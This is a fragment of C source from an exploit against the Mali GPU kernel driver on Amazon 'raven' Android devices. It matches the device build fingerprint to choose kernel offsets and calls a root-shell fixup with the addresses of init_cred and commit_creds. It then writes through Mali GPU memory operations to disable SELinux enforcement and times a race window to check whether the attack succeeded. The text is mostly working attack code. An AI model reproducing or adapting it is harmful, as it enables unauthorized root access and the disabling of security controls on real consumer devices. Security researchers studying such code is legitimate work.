...
#define TOTAL_RESERVED_SIZE 1024 //1024
...
#define SEL_READ_HANDLE_UNKNOWN_7646_3562 0x3641d0
...
#define SEL_READ_HANDLE_UNKNOWN_7646_3565 0x3641d0
...
#define SEL_READ_HANDLE_UNKNOWN_7652_3556 0x3641d0
...
#define SEL_READ_HANDLE_UNKNOWN_7652_3564 0x3641d0
...
static uint64_t selinux_enforcing = SELINUX_ENFORCING_7633_3445;
...
void select_offset() {
  ...
  if (!strcmp(fingerprint, "Amazon/raven/raven:9/PS7633.3445N/0027347744000:user/amz-p,release-keys")) {
    ...
    fixup_root_shell(INIT_CRED_7633_3445, COMMIT_CREDS_7633_3445, SEL_READ_HANDLE_UNKNOWN_7633_3445, ADD_INIT_7633_3445, ADD_COMMIT_7633_3445, &(root_code[0]));
    return;
  }
  
  if (!strcmp(fingerprint, "Amazon/raven/raven:9/PS7646.3550N/0028085968384:user/amz-p,release-keys")) {
    selinux_enforcing = SELINUX_ENFORCING_7646_3550;
    sel_read_handle_unknown = SEL_READ_HANDLE_UNKNOWN_7646_3550;
    fixup_root_shell(INIT_CRED_7646_3550, COMMIT_CREDS_7646_3550, SEL_READ_HANDLE_UNKNOWN_7646_3550, ADD_INIT_7646_3550, ADD_COMMIT_7646_3550, &(root_code[0]));
    return;
  }
  
  if (!strcmp(fingerprint, "Amazon/raven/raven:9/PS7646.3562N/0028085971456:user/amz-p,release-keys")) {
    selinux_enforcing = SELINUX_ENFORCING_7646_3562;
    sel_read_handle_unknown = SEL_READ_HANDLE_UNKNOWN_7646_3562;
    fixup_root_shell(INIT_CRED_7646_3562, COMMIT_CREDS_7646_3562, SEL_READ_HANDLE_UNKNOWN_7646_3562, ADD_INIT_7646_3562, ADD_COMMIT_7646_3562, &(root_code[0]));
    return;
  }     

  if (!strcmp(fingerprint, "Amazon/raven/raven:9/PS7646.3565N/0028085972224:user/amz-p,release-keys")) {
    selinux_enforcing = SELINUX_ENFORCING_7646_3565;
    sel_read_handle_unknown = SEL_READ_HANDLE_UNKNOWN_7646_3565;
    fixup_root_shell(INIT_CRED_7646_3565, COMMIT_CREDS_7646_3565, SEL_READ_HANDLE_UNKNOWN_7646_3565, ADD_INIT_7646_3565, ADD_COMMIT_7646_3565, &(root_code[0]));
    return;
  } 
  
  if (!strcmp(fingerprint, "Amazon/raven/raven:9/PS7652.3556N/0028488623104:user/amz-p,release-keys")) {
    selinux_enforcing = SELINUX_ENFORCING_7652_3556;
    sel_read_handle_unknown = SEL_READ_HANDLE_UNKNOWN_7652_3556;
    fixup_root_shell(INIT_CRED_7652_3556, COMMIT_CREDS_7652_3556, SEL_READ_HANDLE_UNKNOWN_7652_3556, ADD_INIT_7652_3556, ADD_COMMIT_7652_3556, &(root_code[0]));
    return;
  }   
  
  if (!strcmp(fingerprint, "Amazon/raven/raven:9/PS7652.3564N/0028488625152:user/amz-p,release-keys")) {
    selinux_enforcing = SELINUX_ENFORCING_7652_3564;
    sel_read_handle_unknown = SEL_READ_HANDLE_UNKNOWN_7652_3564;
    fixup_root_shell(INIT_CRED_7652_3564, COMMIT_CREDS_7652_3564, SEL_READ_HANDLE_UNKNOWN_7652_3564, ADD_INIT_7652_3564, ADD_COMMIT_7652_3564, &(root_code[0]));
    return;
  } 
...
void check_success() {
  ...
  if (finished_reset_time.tv_sec == finished_fault_time.tv_sec) {
    if (finished_reset_time.tv_nsec > finished_fault_time.tv_nsec + 400000) {  //minimum 400,000ns window
      success = 1;
      return;
    }
  }
...
//  map_reserved(mali_fd2, RESERVED_SIZE, TOTAL_RESERVED_SIZE/RESERVED_SIZE, &(reserved[0]));
  reserve_pages(mali_fd2, RESERVED_SIZE, TOTAL_RESERVED_SIZE/RESERVED_SIZE, &(reserved[0]));  //moved from reset_mali2
...
uint8_t write_selinux(int mali_fd, int mali_fd2, uint64_t pgd, uint64_t* reserved) {
  ...
  atom_number = write_data(mali_fd2, selinux_enforcing, reserved, TOTAL_RESERVED_SIZE/RESERVED_SIZE, 0, MALI_WRITE_VALUE_TYPE_IMMEDIATE_32, RESERVED_SIZE, atom_number);
...
//    uint64_t pgd = alias_region + pg * 0x1000;
    ...
    usleep(100000);
    atom_number = write_selinux(mali_fd, mali_fd2, pgd, &(reserved[0]));
    usleep(100000);
